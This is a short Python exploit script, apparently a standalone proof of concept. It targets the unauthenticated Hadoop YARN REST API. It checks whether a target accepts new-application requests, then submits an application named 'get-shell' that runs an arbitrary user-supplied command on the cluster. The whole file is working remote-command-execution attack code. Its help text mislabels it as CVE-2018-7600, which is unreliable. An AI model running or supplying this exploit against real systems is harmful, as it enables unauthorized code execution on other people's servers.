'''
Hadoop Yarn REST API未授权漏洞
writen by ophxc
漏洞说明：用户可以向YARN提交特定应用程序进行执行，其中就允许执行相关包含系统命令。
'''
import requests
import argparse
import requests

parser=argparse.ArgumentParser(description="usage of CVE-2018-7600")
parser.add_argument("-u","--url",help="the target url",required=True)
parser.add_argument("-c","--command",help="the command you want to excute ")
args=parser.parse_args()

url=args.url
cmd=args.command
a=url
url="http://"+url+"/ws/v1/cluster/apps/new-application"

proxy = {
    'http': '127.0.0.1:8080'
}

res=requests.post(url,proxies=proxy)
try:
    app_id=res.json()['application-id']
    print("it's vulnable")
except:
    exit("it's unvunlable.")
url2="http://"+a+"/ws/v1/cluster/apps"

data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {
            'command': cmd,
        },
    },
    'application-type': 'YARN',
}

res2=requests.post(url=url2,json=data,proxies=proxy)
print("the command is excute and for this exploit it's has no response:\n")